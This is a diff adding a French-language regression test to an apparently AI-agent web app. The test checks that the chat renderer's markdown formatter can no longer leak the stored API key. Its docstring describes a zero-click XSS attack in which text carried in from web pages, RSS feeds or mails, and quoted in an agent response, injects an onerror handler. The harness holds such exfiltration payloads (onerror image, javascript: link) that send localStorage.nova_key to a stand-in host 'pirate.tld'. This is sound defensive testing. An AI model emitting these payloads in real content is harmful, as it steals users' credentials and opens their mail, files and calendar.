@@ -6,6 +6,7 @@ robustesse aux valeurs vides/None). Lancer avec :  python tests/test_nova.py
 """
 import json
 import re
+import shutil
 import sys
 import types
 from pathlib import Path
@@ -4620,6 +4621,85 @@ def test_automatisations_fouillees_et_envoi_verifiable():
     check("il appelle bien la route", "/agent/diag/telegram?envoyer=true" in ui, True)
 
 
+def test_la_cle_ne_peut_pas_quitter_le_telephone():
+    """AUDIT — defaut CRITIQUE : exfiltration de la cle API, SANS aucun clic.
+
+    esc() n'echappait QUE &, < et >. Le guillemet double survivait, et fmt() le
+    recollait AU MILIEU d'un attribut HTML. Une reponse contenant
+    « ![x](a"/onerror="location='https://pirate/?k='+localStorage.nova_key) »
+    produisait un vrai attribut onerror ; comme src=\"a\" echoue toujours, il partait
+    tout seul. La cle AGENT_API_KEY, gardee dans localStorage, quittait l'iPhone sans
+    que Lohan touche a quoi que ce soit — et elle ouvre les 47 routes : mails,
+    agenda, fichiers, automatisations.
+
+    Ce texte n'a pas besoin d'etre ecrit par Lohan : fmt() rend aussi les reponses
+    qui citent une page web, un flux RSS ou un mail — le canal exact identifie a
+    l'audit precedent — et les resultats d'automatisation.
+    """
+    import subprocess, tempfile, os, json as _j
+    from pathlib import Path as _P
+    racine = _P(__file__).resolve().parents[1]
+
+    if not shutil.which("node"):
+        check("node absent — verification statique seule", True, True)
+    else:
+        src = (racine / "ui" / "nova.html").read_text(encoding="utf-8")
+        extrait = src[src.index("function esc(s)"):src.index("function addRow(")]
+        harnais = """
+var KEY='sk-cle-secrete-de-lohan', ORIGIN='https://nova.onrender.com';
+%s
+var cas = {
+ image_piegee: '![logo](x"/onerror="location=\\'https://pirate.tld/?k=\\'+localStorage.nova_key)',
+ lien_javascript: '[clique](javascript:location=\\'https://pirate.tld/?k=\\'+localStorage.nova_key)',
+ cle_vers_un_tiers: '[PDF](https://pirate.tld/d?t=__KEY__)',
+ cle_vers_notre_serveur: '[Mon fichier](/agent/file?id=42&key=__KEY__)',
+ image_normale: '![schema](https://exemple.fr/i.png)',
+ lien_normal: '[Le Monde](https://lemonde.fr/article)',
+ gras_italique: '**important** et *penche*',
+ guillemets: 'Il a dit "bonjour".'
+};
+var out = {}; for (var k in cas) out[k] = fmt(cas[k]);
+console.log(JSON.stringify(out));
+""" % extrait
+        with tempfile.TemporaryDirectory() as d:
+            f = os.path.join(d, "h.js")
+            open(f, "w", encoding="utf-8").write(harnais)
+            r = subprocess.run(["node", f], capture_output=True, text=True, timeout=60)
+            check("le harnais tourne", r.returncode, 0)
+            out = _j.loads(r.stdout.strip().splitlines()[-1]) if r.returncode == 0 else {}
+
+        # 1. Plus aucun gestionnaire d'evenement ne peut naitre du texte.
+        for nom, rendu in out.items():
+            check(f"aucun onerror/onload dans « {nom} »",
+                  bool(re.search(r"\son\w+\s*=", rendu)), False)
+        # 2. Le protocole javascript: est refuse.
+        check("javascript: neutralise", 'href="#"' in out.get("lien_javascript", ""), True)
+        check("image piegee neutralisee", 'src="#"' in out.get("image_piegee", ""), True)
+        # 3. La cle ne part JAMAIS vers un tiers…
+        for nom, rendu in out.items():
+            if nom != "cle_vers_notre_serveur":
+                check(f"la cle n'apparait pas dans « {nom} »",
+                      "sk-cle-secrete-de-lohan" in rendu, False)
+        # …mais elle marche encore sur NOS liens de fichiers.
+        check("la cle reste posee sur nos propres liens",
+              "sk-cle-secrete-de-lohan" in out.get("cle_vers_notre_serveur", ""), True)
+        # 4. Le rendu normal n'est pas abime.
+        check("une image normale s'affiche encore",
+              'src="https://exemple.fr/i.png"' in out.get("image_normale", ""), True)
+        check("un lien normal marche encore",
+              'href="https://lemonde.fr/article"' in out.get("lien_normal", ""), True)
+        check("le gras marche encore", "<b>important</b>" in out.get("gras_italique", ""), True)
+        check("les guillemets sont echappes",
+              "&quot;bonjour&quot;" in out.get("guillemets", ""), True)
+
+    # 5. Les TROIS pages echappent les guillemets — pas seulement celle qu'on a corrigee.
+    for page in ("nova.html", "cours.html", "brain.html"):
+        t = (racine / "ui" / page).read_text(encoding="utf-8")
+        bloc = t.split("function esc(s)", 1)[1].split("\n\n", 1)[0]
+        check(f"{page} echappe le guillemet double", '&quot;' in bloc, True)
+        check(f"{page} echappe l'apostrophe", "&#39;" in bloc, True)
+
+
 if __name__ == "__main__":
     for fn in (test_routage, test_echecs, test_dates, test_titres, test_robustesse,
                test_visuels, test_profil, test_automatisations, test_escouade,
@@ -4649,7 +4729,8 @@ if __name__ == "__main__":
                test_protocole_jamais_montre_ni_flux_casse,
                test_injection_donnees_et_cours_complet,
                test_discord_ferme_et_outils_dangereux_hors_de_portee,
-               test_automatisations_fouillees_et_envoi_verifiable):
+               test_automatisations_fouillees_et_envoi_verifiable,
+               test_la_cle_ne_peut_pas_quitter_le_telephone):
         try:
             fn()
         except Exception as e:
